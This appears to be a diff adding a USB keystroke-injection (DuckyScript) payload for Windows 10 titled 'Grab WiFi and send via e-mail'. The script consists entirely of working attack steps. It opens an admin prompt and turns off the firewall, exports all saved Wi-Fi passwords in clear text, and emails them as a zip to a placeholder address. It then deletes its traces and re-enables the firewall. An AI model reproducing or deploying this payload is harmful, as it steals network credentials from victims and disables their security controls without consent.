@@ -1,0 +1,79 @@
+REM =============================================
+REM = Windows 10: Grab WiFi and send via e-mail =
+REM =============================================
+
+DELAY 2000
+GUI d
+DELAY 400
+GUI r
+DELAY 600
+STRING cmd
+DELAY 600
+CTRL SHIFT ENTER
+DELAY 800
+TAB
+DELAY 800
+TAB
+DELAY 600
+ENTER
+DELAY 800
+STRING netsh advfirewall set  currentprofile state off
+ENTER
+DELAY 400
+STRING mkdir c:\grab
+ENTER
+DELAY 200
+STRING cd c:\grab
+ENTER
+DELAY 200
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 500
+STRING tar.exe -cf c:\grab\wifi.zip *.xml
+ENTER
+DELAY 400
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+TAB
+DELAY 400
+TAB
+DELAY 400
+ENTER
+DELAY 800
+STRING $SMTPServer = 'smtp.example.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('login', 'password');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'sender@example.com'
+ENTER
+STRING $ReportEmail.To.Add('receiver@example.com')
+ENTER
+STRING $ReportEmail.Subject = 'New Messege ;)'
+ENTER
+STRING $ReportEmail.Body = 'Hello world!' 
+ENTER
+STRING $ReportEmail.Attachments.Add('c:\grab\wifi.zip')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 600
+STRING exit
+ENTER
+DELAY 400
+STRING cd ..
+ENTER
+STRING rmdir /Q /S c:\grab
+ENTER
+DELAY 200
+STRING netsh advfirewall set  currentprofile state on
+ENTER
+DELAY 400
+STRING exit
+ENTER
